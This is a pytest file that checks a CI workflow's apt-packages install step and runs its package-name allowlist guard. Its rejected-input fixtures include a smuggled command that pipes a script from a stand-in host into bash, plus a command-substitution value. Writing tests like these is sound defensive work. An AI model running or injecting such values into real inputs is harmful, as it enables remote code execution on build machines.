"""Guard for the FND-110 apt-packages remediation in the conformance pipeline.

The D-series leg is the FOURTH runner-sync site in the fleet.  #3060 wired
``apt-packages`` into tests-reusable.yaml for the three tests jobs (unit,
integration, e2e); its guard in test_apt_packages_and_summary_parse.py pinned
RUNNER_SYNC_JOBS to exactly those three and the conformance D leg was missed
because it lives in a different workflow (conformance-reusable.yaml) that was
not part of that remediation's sweep.  It is a runner-sync site for the same
reason as the tests jobs: D001/D002/D003 map declared dependencies to import
names via installed package metadata, so the leg runs ``uv sync`` (the
run-conformance-detect action's needs-env step) and a native sdist such as
hive's pykerberos (needs libkrb5-dev for gssapi/gssapi.h) fails during sync,
before detect ever runs — so zero rules are evaluated.

The wiring is asserted as YAML shape, same rationale as
test_apt_packages_and_summary_parse.py: the protected behaviour is GitHub
Actions' own and cannot be exercised without a runner.  The step's allowlist
guard, by contrast, IS executed — lifted verbatim from the workflow and run
against accepted and rejected values — and is pinned byte-identical to the
tests-reusable copy so the two cannot drift.
"""

from __future__ import annotations

import os
import subprocess
from pathlib import Path

import pytest
import yaml

REPO_ROOT = Path(__file__).resolve().parents[3]
CONFORMANCE = REPO_ROOT / ".github" / "workflows" / "conformance-reusable.yaml"
TESTS_REUSABLE = REPO_ROOT / ".github" / "workflows" / "tests-reusable.yaml"

APT_STEP_NAME = "Install system packages (apt-packages)"
RUN_SERIES_STEP_NAME = "Run ${{ matrix.series }}-series checks"


@pytest.fixture(scope="module")
def workflow() -> dict:  # type: ignore[type-arg]
    return yaml.safe_load(CONFORMANCE.read_text())


@pytest.fixture(scope="module")
def suite(workflow: dict) -> dict:  # type: ignore[type-arg]
    return workflow["jobs"]["suite"]


@pytest.fixture(scope="module")
def tests_workflow() -> dict:  # type: ignore[type-arg]
    return yaml.safe_load(TESTS_REUSABLE.read_text())


def test_apt_packages_input_is_declared_and_off_by_default(workflow: dict) -> None:  # type: ignore[type-arg]
    inputs = workflow[True]["workflow_call"]["inputs"]  # `on` parses as True
    assert (
        "apt-packages" in inputs
    ), "apt-packages input missing from conformance-reusable"
    assert inputs["apt-packages"].get("default", "") == "", (
        "apt-packages must default to empty — the step must be a no-op for "
        "every existing caller"
    )


def _apt_step(job: dict) -> dict:  # type: ignore[type-arg]
    steps = [s for s in job["steps"] if s.get("name") == APT_STEP_NAME]
    assert steps, f"missing '{APT_STEP_NAME}' step"
    return steps[0]


def test_apt_step_exists_in_the_suite_job(suite: dict) -> None:  # type: ignore[type-arg]
    assert APT_STEP_NAME in [s.get("name") for s in suite["steps"]]


def test_apt_step_precedes_the_run_series_checks_step(suite: dict) -> None:  # type: ignore[type-arg]
    """A post-detect install would be dead code for the failure it fixes: the
    D leg's `uv sync` (and its native-sdist build) happens inside the detect
    action, so the packages must be on the runner before that step fires."""
    names = [s.get("name") or s.get("uses", "") for s in suite["steps"]]
    apt_idx = names.index(APT_STEP_NAME)
    run_idx = names.index(RUN_SERIES_STEP_NAME)
    assert apt_idx < run_idx, "apt step must run before the detect action"

    assert "Set up uv" in names[:apt_idx], (
        "apt step must sit after 'Set up uv' so the ordering requirement the "
        "task pins is explicit"
    )


def test_apt_step_is_gated_on_input_and_matrix(suite: dict) -> None:  # type: ignore[type-arg]
    """The guards must live in `if:`, never in the shell
    (docs/standards/ci.md).  The `matrix.needs_env == 'true'` clause keeps
    the 10 isolated legs from running a pointless apt-get update + install;
    the relevance disjunction keeps the D leg from installing packages on a
    PR that does not touch its `**/pyproject.toml` filter (when it would then
    no-op)."""
    step = _apt_step(suite)
    cond = step.get("if", "")
    assert (
        "inputs.apt-packages != ''" in cond
    ), "apt step must self-skip when the input is empty"
    assert (
        "matrix.needs_env == 'true'" in cond
    ), "apt step must be a no-op on the isolated (non-D) legs"
    for clause in (
        "steps.changes.outputs.relevant == 'true'",
        "inputs.event_name == 'push'",
        "inputs.force-all",
    ):
        assert (
            clause in cond
        ), f"apt step must self-skip when the leg is not relevant ({clause})"


def test_apt_step_shares_the_run_series_relevance_gate(suite: dict) -> None:  # type: ignore[type-arg]
    """The apt step fires under exactly the legs the detect step fires under,
    so its relevance condition is derived from — and must contain — the one on
    `Run ${{ matrix.series }}-series checks`.  A hardcoded copy would keep
    passing while the two drifted, so this normalises whitespace and asserts
    containment instead."""
    run_step = next(s for s in suite["steps"] if s.get("name") == RUN_SERIES_STEP_NAME)

    def _normalise(cond: str) -> str:
        return " ".join(cond.split())

    run_cond = _normalise(run_step.get("if", ""))
    assert run_cond in _normalise(_apt_step(suite).get("if", "")), (
        "apt step's relevance gate must contain the detect step's condition — "
        "the install would otherwise fire for legs that then no-op"
    )


def test_apt_step_routes_the_value_through_env(suite: dict) -> None:  # type: ignore[type-arg]
    """docs/standards/ci.md: caller-controlled values reach `run:` via env,
    never by direct ``${{ }}`` interpolation into the script text."""
    step = _apt_step(suite)
    assert step.get("env", {}).get("APT_PACKAGES") == "${{ inputs.apt-packages }}"
    assert (
        "${{" not in step["run"]
    ), "apt step interpolates an expression into the shell script"


def test_only_the_d_leg_materialises_the_environment(suite: dict) -> None:  # type: ignore[type-arg]
    """The matrix condition is only meaningful if exactly one leg syncs.  The
    other ten legs run detect from an isolated `uvx` env."""
    needs_env_legs = [
        m["series"]
        for m in suite["strategy"]["matrix"]["include"]
        if m.get("needs_env") == "true"
    ]
    assert needs_env_legs == [
        "D"
    ], f"expected only the D leg to set needs_env, got {needs_env_legs}"


# ---------------------------------------------------------------------------
# apt-packages validation: run the real guard from the workflow's own script.
# ---------------------------------------------------------------------------
#
# Same rationale as test_apt_packages_and_summary_parse.py: the value must
# reach `apt-get install` unquoted, so it is matched whole against a strict
# Debian package-name allowlist first.  These tests EXECUTE the guard lifted
# verbatim from the workflow, with the value supplied through the environment
# exactly as GitHub supplies it — a test that re-stated the regex would keep
# passing while the workflow drifted.


def _apt_guard(job: dict) -> str:  # type: ignore[type-arg]
    """Lift the printf|tr|grep validation pipeline out of the apt step."""
    script = _apt_step(job)["run"]
    lines = script.splitlines()
    starts = [i for i, line in enumerate(lines) if line.strip().startswith("printf")]
    assert starts, (
        "apt step no longer validates the value before installing — if the "
        "guard was rewritten, update this test to execute the new form"
    )
    start = starts[0]
    end = start
    while lines[end].rstrip().endswith("\\"):
        end += 1
    guard = "\n".join(line.strip() for line in lines[start : end + 1])
    assert "grep" in guard, f"guard is not an allowlist match: {guard!r}"
    return guard.replace("\\\n", " ")


def test_apt_step_validates_before_it_installs(suite: dict) -> None:  # type: ignore[type-arg]
    """The guard exists, runs before the install, and cannot fail open."""
    script = _apt_step(suite)["run"]
    _apt_guard(suite)
    assert "set -euo pipefail" in script, (
        "apt step must set -e explicitly — relying on the runner default lets "
        "a later `defaults: run: shell:` make the guard fail open "
        "(docs/standards/ci.md)"
    )
    assert script.index("printf") < script.index(
        "apt-get install"
    ), "the allowlist guard must run before apt-get install"


def test_apt_guard_is_byte_identical_to_tests_reusable(
    suite: dict,
    tests_workflow: dict,  # type: ignore[type-arg]
) -> None:
    """One guard, two workflows: pin the copies together so a fix to one that
    misses the other fails here rather than silently half-landing."""
    tests_unit = tests_workflow["jobs"]["unit"]
    assert _apt_guard(suite) == _apt_guard(
        tests_unit
    ), "conformance apt guard has drifted from the tests-reusable copy"


# The Hive list, plus the C++/versioned names whose `+` and `.` the allowlist
# must not reject.
ACCEPTED = [
    "libkrb5-dev gcc python3-dev",
    "g++",
    "libstdc++6",
    "python3.11-dev",
]
# One entry per rejected class, not one per exploit string.
REJECTED = [
    "libkrb5-dev:amd64",  # arch-qualified
    "libkrb5-dev=1.2.3",  # version-pinned
    "-y",  # apt flag
    "./local.deb",  # local package path
    "lib*",  # glob — DOES expand on the unquoted use
    "libkrb5-dev; curl evil.example/sh | bash",  # command separator
    "libkrb5-dev $(id)",  # substitution syntax
    "LibKrb5-Dev",  # not a legal Debian name
]


def _run_guard(guard: str, value: str) -> subprocess.CompletedProcess[str]:
    """Execute the guard with the value injected through the environment —
    the same route GitHub uses for the step's `env:` block."""
    return subprocess.run(
        ["bash", "-c", f"set -euo pipefail\n{guard}\n"],
        capture_output=True,
        text=True,
        timeout=30,
        env={"PATH": os.environ.get("PATH", ""), "APT_PACKAGES": value},
    )


@pytest.mark.parametrize("value", ACCEPTED)
def test_apt_guard_accepts_real_package_lists(suite: dict, value: str) -> None:  # type: ignore[type-arg]
    proc = _run_guard(_apt_guard(suite), value)
    assert proc.returncode == 0, (
        f"guard rejected a legitimate package list {value!r} — the apt step "
        f"would fail the D leg before detect runs.\nstderr: {proc.stderr}"
    )


@pytest.mark.parametrize("value", REJECTED)
def test_apt_guard_rejects_anything_that_is_not_a_package_name(
    suite: dict,  # type: ignore[type-arg]
    value: str,
) -> None:
    proc = _run_guard(_apt_guard(suite), value)
    assert (
        proc.returncode != 0
    ), f"guard accepted {value!r}, which is not a list of Debian package names"


def test_apt_guard_rejects_an_empty_value(suite: dict) -> None:  # type: ignore[type-arg]
    """Belt to the step's `if:` brace: were the gate ever dropped, an empty
    value must not reach `apt-get install` with no arguments."""
    assert _run_guard(_apt_guard(suite), "").returncode != 0
